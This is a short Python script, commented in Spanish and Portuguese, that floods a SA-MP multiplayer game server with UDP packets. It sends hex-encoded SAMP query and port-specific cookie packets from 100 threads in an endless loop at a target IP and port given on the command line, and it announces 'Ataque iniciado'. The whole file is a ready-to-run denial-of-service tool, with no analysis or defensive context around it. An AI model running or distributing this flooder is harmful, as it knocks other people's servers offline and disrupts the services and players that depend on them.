#!/usr/bin/env python
import socket
import struct
import codecs
import sys
import threading
import random
import time
import os
import signal

# Manejar la señal de terminación
def signal_handler(sig, frame):
    print('\nAtaque detenido')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

ip = sys.argv[1]
port = sys.argv[2]
orgip = ip

Pacotes = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),  # p
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),  # c
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),  # i
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),  # r
    codecs.decode("081e62da", "hex_codec"),  # cookie port 7796
    codecs.decode("081e77da", "hex_codec"),  # cookie port 7777
    codecs.decode("081e4dda", "hex_codec"),  # cookie port 7771
    codecs.decode("021efd40", "hex_codec"),  # cookie port 7784
    codecs.decode("021efd40", "hex_codec"),  # cookie port 1111 
    codecs.decode("081e7eda", "hex_codec")   # cookie port 1111 tambem
]

print("Ataque iniciado en IP: %s Puerto: %s" % (orgip, port))

class MyThread(threading.Thread):
    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0, 3)]
                
                sock.sendto(msg, (ip, int(port)))
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                    
                sock.close()
            except:
                pass

if __name__ == '__main__':
    try:
        threads = []
        for x in range(100):
            mythread = MyThread()
            mythread.daemon = True
            mythread.start()
            threads.append(mythread)
            time.sleep(.1)
        
        # Mantener el hilo principal vivo
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print('\nAtaque detenido')
        sys.exit(0)